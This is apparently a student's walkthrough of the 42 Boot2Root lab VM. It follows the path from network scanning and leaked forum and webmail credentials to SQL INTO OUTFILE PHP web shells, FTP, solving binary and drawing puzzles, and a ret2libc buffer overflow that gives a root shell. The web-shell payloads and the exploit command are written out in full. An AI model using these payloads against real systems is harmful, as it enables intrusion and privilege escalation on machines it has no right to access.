# Boot2Root 42 Project - Write Up 1

## Step 1: find the VM's IP

BEFORE ANYTHING : when setting up your vm in network, set it to bridged adapter, select the wifi card in the section name and then, make sure you're also connected to a wifi

First, find your local ip so you scan it

```
on Windows :
>ipconfig
    Wireless LAN adapter Wi-Fi 2
        IPv4 Address. . . . . . . . . . . : 192.168.1.45
        Subnet Mask . . . . . . . . . . . : 255.255.255.0
        Default Gateway . . . . . . . . . : 192.168.1.255

on Macs :
    Maxime je te laisse remplir ca
```

Now we know our local ip, so we'll scan it using nmap ans after a few minutes we end up with :

```
>nmap 192.168.1.0/24
...
    Nmap scan report for BornToSecHackMe-001.lan (192.168.1.74)
    Host is up (0.0031s latency).
    Not shown: 994 closed tcp ports (reset)
    PORT    STATE SERVICE
    21/tcp  open  ftp
    22/tcp  open  ssh
    80/tcp  open  http
    143/tcp open  imap
    443/tcp open  https
    993/tcp open  imaps
    MAC Address: DC:1B:A1:92:89:AC (Intel Corporate)
...
```

## Step 2: Use the port 443

Now that we know the ip of the vm all we need to do is to put it our browser to discover a simple web page asking to be hacked (cheeky page)

To do so, we'll use nikto by using
```
>perl nikto.pl -h 192.168.1.74 -p 443
...
    + OSVDB-3092: /forum/: This might be interesting.
    + OSVDB-3093: /webmail/src/read_body.php: SquirrelMail found
    + /phpmyadmin/: phpMyAdmin directory found
...
```
And now we can verify directly on our browser that yes, we have access to

    192.168.1.74/forum
    192.168.1.74/webmail
    192.168.1.74/phpmyadmin

## Step 3: Abuse the forum

first thing, we can see in the head that this forum is made using my little forum 2.3.4 an information usefull later.

But for now we'll go ont the forum and search for anything fishy, and something fishy we found on the topic "Problem login ?" where the user lmezard posted a log from a ssh connection.

And when you read the log you can find this line:

    Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2

which is lmezard's password on the forum

After loging in as them, the only new thing we get is a list of all the user registered on the forum and the User Area where we found their mail :

    laurie@borntosec.net

## Step 4: Webmail

Since we have laurie's mail we can login with the same password

And the first mail called "DB Access" contain with no surprise     

    Hey Laurie,

    You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

    Best regards.

## Step 5: PhpMyAdmin

As promised, the version of MLF is important now since we can see in the table  mlf2_userdata the hashed password of all the users.

But im too busy to care. Since we are root we can inject anything with SQL
and we have this https://www.informit.com/articles/article.aspx?p=1407358&seqNum=2

deux choses importantes:
1. https://192.168.1.74/forum/templates_c/.dummy doesn't cause any errors (/templates_c/.dummy is a file accessible in the git)
2. the principe of the sql request is to write in the templates_c directory in a new php file a php element executing a bash command

### Exploit 1:

    select "<?php $out = shell_exec('ls -laR /'); echo '<pre>' . $out . '</pre>'; ?>" into outfile "/var/www/forum/templates_c/ls.php";

Now https://192.168.1.74/forum/templates_c/ls.php display the result
and no surprise an easy to see LOOKATME folder is here so we just need to read what's inside the password file

### Exploit 2:

    select "<?php $out = shell_exec('cat /home/LOOKATME/password /'); echo '<pre>' . $out . '</pre>'; ?>" into outfile "/var/www/forum/templates_c/pogger.php";

and now https://192.168.1.74/forum/templates_c/pogger.php gives us

    lmezard:G!@M6f4Eatau{sF"

## Step 6: The ftp server

Since we can't login via ssh with those id, we will connect to the ftp server

to do so:
```
    pwd>ftp 192.168.1.74

    Connected to 192.168.1.74.
    220 Welcome on this server
    200 Always in UTF8 mode.
    User (192.168.1.74:(none)): lmezard
    331 Please specify the password.
    Password: G!@M6f4Eatau{sF"
    230 Login successful.
```

We'll use "dir" to list the file we have access to et get to retrieve them on our host.

The README file say that we'll get the ssh password of the user laurie using the "fun" file

So we have to tar -xf the file and get a bunch of .pcap files

## Fun's  solution

So since we're on our host, we have the wonderfull tool VSC, and we dont have to work on vim. so when you open anyway using vsc's built-in decoder, we'll get a lot of thing

and while scrolling you'll spot some getmeX() functions that you will find in random .pcap files and using the comment's number + 1 you'll find the letter corresponding

now that you have your 12 letters password hash it in sha-256 and you have your password for laurie
after retrieving  all the letter we end up with :
```
Iheartpwnage

in SHA-256:
    330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```


## Step 7 Ssh

first i start to connect with
```
ssh laurie@192.168.1.21
```

now i use ls
```
laurie@BornToSecHackMe:~$ ls
bomb  README
```

bomb is an executable so I will analyze it with ghidra
I copy bomb on my pc
```
scp -P 22 laurie@192.168.1.21:~/bomb .
```

after the analysis we directly see 6 phases which are resolved by writing:
```
Public speaking is very easy.
1 2 6 24 120 720
1 b 214
9
opekmq
4 2 6 3 1 5
```

```
laurie@BornToSecHackMe:~$ ./bomb 
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
Public speaking is very easy.
Phase 1 defused. How about the next one?
1 2 6 24 120 720
That's number 2.  Keep going!
1 b 214
Halfway there!
9
So you got that one.  Try this one.
opekmq
Good work!  On to the next...
4 2 6 3 1 5
Congratulations! You've defused the bomb!
```

then we defused the bomb I look at the readme and it tells me

```
When you have all the password use it as "thor" user with ssh.
```

we therefore obtain a user thor and his mdp which is the 6 phases to paste without the spaces

```
Publicspeakingisveryeasy.126241207201b2149opekmq426135
```

## Step 8 ssh

```
ssh thor@192.168.1.21
```

so in this ssh there is:
```
thor@BornToSecHackMe:~$ ls
README  turtle
```

```
thor@BornToSecHackMe:~$ cat README 
Finish this challenge and use the result as password for 'zaz' user.
```

in the turtle file we have lots of indications I think of a labyrinth or a drawing I will find out how to do it

we have
```
Tourne gauche de 90 degrees
Avance 50 spaces

ensuite 180
Tourne gauche de 1 degrees
Avance 1 spaces

ensuite 180
Tourne droite de 1 degrees
Avance 1 spaces

Avance 50 spaces

Avance 210 spaces
Recule 210 spaces
Tourne droite de 90 degrees
Avance 120 spaces

Avance 210 spaces
Recule 210 spaces
Tourne droite de 90 degrees
Avance 120 spaces

Tourne droite de 10 degrees
Avance 200 spaces
Tourne droite de 150 degrees
Avance 200 spaces
Recule 100 spaces
Tourne droite de 120 degrees
Avance 50 spaces

Tourne gauche de 90 degrees
Avance 50 spaces



Avance 210 spaces
Recule 210 spaces
Tourne droite de 90 degrees
Avance 120 spaces

Tourne droite de 10 degrees
Avance 200 spaces
Tourne droite de 150 degrees
Avance 200 spaces
Recule 100 spaces
Tourne droite de 120 degrees
Avance 50 spaces


Tourne gauche de 90 degrees
Avance 50 spaces
encore
Avance 180 spaces
Tourne gauche de 180 degrees
encore
Avance 180 spaces
Tourne droite de 180 degrees


Avance 50 spaces

Avance 100 spaces
Recule 200 spaces
Avance 100 spaces
Tourne droite de 90 degrees
Avance 100 spaces
Tourne droite de 90 degrees
Avance 100 spaces
Recule 200 spaces
```

suddenly after doing a little rough paint I found the word SLASH

and with the sentence

```
Can you digest the message? :)
```

there must be some help in this post
I typed digest message on the internet and I came across MD5 I will decipher or encrypt this message it may help us

find MD5
```
646da671ca01bb5d84dbb5fb2238dc8e
```

## Step 9

```
zaz@BornToSecHackMe:~$ ls
exploit_me  mail
```
we have an exploit_me executable

we will analyze it

we find a strcpy

I'm going to start with a small gdb + shellcode

I have to find when it segfault

i will use my magic site
```
https://wiremask.eu/tools/buffer-overflow-pattern-generator/?
```

which gives me a character string that I can launch in the run and which will tell me where it goes

```
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Starting program: /home/zaz/exploit_me Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x37654136 in ?? ()
```

on the gdb we go

```
0x37654136
et on obtient
140
```

we will try to get the system now

```
   0x080483f4 <+0>:	push   %ebp
   0x080483f5 <+1>:	mov    %esp,%ebp
   0x080483f7 <+3>:	and    $0xfffffff0,%esp
   0x080483fa <+6>:	sub    $0x90,%esp
   0x08048400 <+12>:	cmpl   $0x1,0x8(%ebp)
   0x08048404 <+16>:	jg     0x804840d <main+25>
   0x08048406 <+18>:	mov    $0x1,%eax
   0x0804840b <+23>:	jmp    0x8048436 <main+66>
   0x0804840d <+25>:	mov    0xc(%ebp),%eax
   0x08048410 <+28>:	add    $0x4,%eax
   0x08048413 <+31>:	mov    (%eax),%eax
   0x08048415 <+33>:	mov    %eax,0x4(%esp)
   0x08048419 <+37>:	lea    0x10(%esp),%eax
   0x0804841d <+41>:	mov    %eax,(%esp)
   0x08048420 <+44>:	call   0x8048300 <strcpy@plt>
   0x08048425 <+49>:	lea    0x10(%esp),%eax
   0x08048429 <+53>:	mov    %eax,(%esp)
   0x0804842c <+56>:	call   0x8048310 <puts@plt>
   0x08048431 <+61>:	mov    $0x0,%eax
   0x08048436 <+66>:	leave  
   0x08048437 <+67>:	ret    
```

we break before the end


```
Breakpoint 1, 0x08048436 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
```

0x08048436 = system

then we look for the bin/sh

```
(gdb) find __libc_start_main,+123456789,"/bin/sh"
0xb7f8cc58
warning: Unable to access target memory at 0xb7fd3160, halting search.
1 pattern found.
```

0xb7f8cc58 = bin/sh

donc on a 140 overflow 0x08048436 system et 0xb7f8cc58 bin/sh

```
zaz@BornToSecHackMe:~$ ./exploit_me `python -c "print('A' * 140 + '\x60\xb0\xe6\xb7' + 'AAAA' + '\x58\xcc\xf8\xb7')"`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`??AAAAX???
# whoami
root
```

WIN